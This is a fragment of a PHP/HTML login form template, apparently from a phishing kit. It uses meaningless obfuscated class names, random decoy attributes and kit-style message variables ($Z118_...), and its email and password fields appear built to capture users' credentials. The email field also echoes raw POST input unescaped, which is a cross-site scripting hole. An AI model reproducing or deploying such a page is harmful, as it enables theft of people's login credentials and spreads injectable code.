			...
			<header>
                ...
                <section id="login" class="login">
                    <form for=" a46d4ace14caf05f50af464dee58a718 " action="" method="post" class="proceed maskable" id="formulario" name="login">
						...
						?>
						<div id=" 1214267056 " class="error-assat">
			<div id=" -737418241 " class="lisar"><img src="./error.png"></div>
			<div class="liman"> <?php echo $Z118_13; ?>. </div>
			</div>
                            <div class="a-n-o-n-i-s-m-a" id="login_emaildiv">
                                <div class="a-n-o-n-i-s-m-a" style="z-index: 100;">
                                    <div for=" 47528614218 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_email" type="email" placeholder="<?php echo $Z118_02; ?>" id="emay-add" value="<?php if(isset($_POST['login_email'])== true){ echo $_POST['login_email'];} ?>">
                                    </div>
                                ...
                                <div id=" 31201284366 " class="a-n-o-n-i-s-m-a">
                                    <div id=" 42512980078 " class="khana-jadida tikchb-ila">
                                        <input for=" a46d4ace14caf05f50af464dee58a718 " class="controlar-formu" name="login_password" type="password" placeholder="<?php echo $Z118_03; ?>" id="password">
                                    </div>
